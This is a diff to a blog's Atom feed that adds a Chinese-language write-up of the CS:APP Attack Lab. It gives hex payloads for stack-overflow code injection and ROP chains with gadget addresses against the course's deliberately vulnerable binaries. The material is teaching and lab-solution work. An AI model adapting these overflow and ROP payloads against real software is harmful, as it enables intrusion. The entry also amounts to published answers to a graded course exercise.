@@ -6,7 +6,7 @@
   <link href="http://m1n9yu3.github.io/atom.xml" rel="self"/>
   
   <link href="http://m1n9yu3.github.io/"/>
-  <updated>2021-04-25T11:00:38.514Z</updated>
+  <updated>2021-04-30T02:38:12.290Z</updated>
   <id>http://m1n9yu3.github.io/</id>
   
   <author>
@@ -15,6 +15,28 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>csapp-attacklabs</title>
+    <link href="http://m1n9yu3.github.io/2021/04/30/csapp-attacklabs/"/>
+    <id>http://m1n9yu3.github.io/2021/04/30/csapp-attacklabs/</id>
+    <published>2021-04-30T02:35:44.000Z</published>
+    <updated>2021-04-30T02:38:12.290Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="stack-overflow"><a href="#stack-overflow" class="headerlink" title="stack overflow"></a>stack overflow</h1><h2 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h2><p>40 字节处溢出， 直接偏移， 填上地址即可</p><h2 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h2><p>堆栈执行代码， ret 到堆栈， 堆栈地址不变</p><p>mov 覆盖掉 val 的值， 然后按照堆栈布局，布置 touch2 的地址存放位置</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 13 36 40 00<br></code></pre></td></tr></table></figure><h2 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h2><p>思路同第二关， 堆栈执行代码，  字符串也加到堆栈中，来进行比较</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">bf 80 dc 61 55 c3 00 00 50 50 50 50 50 50 50 50 00 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 dc 61 55 00 00 00 00 78 dc 61 55 00 00 00 00 fa 18 40 00<br></code></pre></td></tr></table></figure><p>替换 ppppp 为想要的字符串即可 成功 exploit</p><h1 id="rop"><a href="#rop" class="headerlink" title="rop"></a>rop</h1><h2 id="第一关-1"><a href="#第一关-1" class="headerlink" title="第一关"></a>第一关</h2><p>利用 程序里面的代码片段，实现改写 rdi 的值   59B997FAh</p><p>wp里说，要利用 start_farm -  end_farm 之间的函数 ， 然后开始构造 rop 链子</p><p><a href="https://blog.csdn.net/qq_41409438/article/details/103134908">https://blog.csdn.net/qq_41409438/article/details/103134908</a></p><p>参照这个 level4  解法， 我一开始没想到指令还可以分散开来的， 学到了学到了</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">bf 80 dc 61 55 c3 00 00 50 50 50 50 50 50 50 50 00 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ab 19 40 00 00 00 00 00 fa 97 b9 59 00 00 00 00 a2 19 40 00 00 00 00 00 ec 17 40 00 00 00 00 00<br></code></pre></td></tr></table></figure><p>pop rax </p><p>nop</p><p>ret</p><p>mov rdi,rax</p><p>ret</p><p>touch2 func</p><p><img src="https://raw.githubusercontent.com/m1n9yu3/image_markdown/main/blogimg/20210430103633.png" alt="img"></p><h2 id="第二关-1"><a href="#第二关-1" class="headerlink" title="第二关"></a>第二关</h2><p>利用堆栈地址存储字符串， 来构造 完美的rop 链</p><p>0x401aad</p><p>mov rax, rsp ; nop ; ret</p><p>0x00000000004019d8 : </p><p>add al, 0x37 ; ret</p><p>0x00000000004019c5 :</p><p>mov rdi, rax ; nop ; ret</p><p>然后手动在堆栈中计算偏移，填上去 ，得到的最后的 exp 为</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tex">bf 80 dc 61 55 c3 00 00 50 50 50 50 50 50 50 50 00 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ad 1a 40 00 00 00 00 00 d8 19 40 00 00 00 00 00 c5 19 40 00 00 00 00 00 fa 18 40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 11 11 22 22 22 33 33 44 55 00 00 00 50 50 50 51 50 50 50 50 00 00 00 00<br></code></pre></td></tr></table></figure><p>栈地址是一个从大到小的地址池，这边使用的是 add 加地址，所有 字符串在后面， 只需要将生成的 raw 中的ppppppq 替换成想要的字符串即可</p><p><img src="https://raw.githubusercontent.com/m1n9yu3/image_markdown/main/blogimg/20210430103638.png" alt="img"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;stack-overflow&quot;&gt;&lt;a href=&quot;#stack-overflow&quot; class=&quot;headerlink&quot; title=&quot;stack overflow&quot;&gt;&lt;/a&gt;stack overflow&lt;/h1&gt;&lt;h2 id=&quot;第一关&quot;&gt;&lt;a href=&quot;#第一</summary>
+      
+    
+    
+    
+    
+    <category term="csapp" scheme="http://m1n9yu3.github.io/tags/csapp/"/>
+    
+  </entry>
   
   <entry>
     <title>gwctf-2019-babyvm详细分析</title>
